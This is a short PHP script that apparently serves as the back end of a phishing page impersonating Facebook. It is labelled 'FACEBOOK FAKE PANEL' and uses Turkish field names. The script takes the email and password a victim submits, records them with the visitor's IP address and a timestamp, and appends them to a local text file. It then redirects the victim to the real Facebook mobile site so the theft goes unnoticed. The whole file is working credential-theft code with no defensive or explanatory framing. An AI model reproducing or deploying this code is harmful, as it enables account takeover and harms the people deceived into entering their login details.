<?php
if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r";
    }
if (isset($_POST['email']) && isset($_POST['pass'])) {

$save = fopen("saved_info.txt","a+");
$eposta = $_POST['email'];
$password = $_POST['pass'];
date_default_timezone_set('Europe/Istanbul');
$tarih = date('d/m/Y H:i:s');
$vericekilen = ("
+-+-+ FACEBOOK FAKE PANEL +-+-+

 Tarih         : ".$tarih."

 İp Adresi     : ".$ipaddress."

 E POSTA       : ".$eposta."

 Şifre         : ".$password."

+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
");
fwrite($save,$vericekilen);
fclose($save);
header('Location: https://m.facebook.com');
}
?>
